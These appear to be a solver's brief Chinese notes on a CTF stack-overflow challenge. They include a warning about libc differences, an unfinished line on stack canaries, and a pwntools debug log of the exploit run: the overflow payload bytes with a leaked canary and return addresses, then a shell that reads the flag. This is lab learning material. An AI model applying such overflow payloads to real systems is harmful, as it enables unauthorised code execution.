
# 注意点
本libc和远程可能不一样

# 知识点
在计算机安全中，"canary"（栈保护金丝雀）在同一个程序实例（单次运行）中的行为如下：

# getshell
```
[DEBUG] Sent 0x59 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  00 25 3a 2d  79 b8 91 bc  │aaaa│aaaa│·%:-│y···│
    00000030  00 00 00 00  00 00 00 00  1a 50 2e a5  9e 55 00 00  │····│····│·P.·│·U··│
    00000040  33 55 2e a5  9e 55 00 00  bd 65 b8 f6  36 7f 00 00  │3U.·│·U··│·e··│6···│
    00000050  90 42 a2 f6  36 7f 00 00  0a                        │·B··│6···│·│
    00000059
/home/task/2025/07-05-leize/stack/exp.py:81: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendlineafter("ch: ", "3")
[DEBUG] Received 0x39 bytes:
    b'your input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
    b'ch: '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[*] Switching to interactive mode
$ cat flag*
[DEBUG] Sent 0xa bytes:
    b'cat flag*\n'
[DEBUG] Received 0x13 bytes:
    b'flag{this_is_flag}\n'
flag{this_is_flag}
```


![](https://r2.20161023.xyz/pic/20250725155631786.png)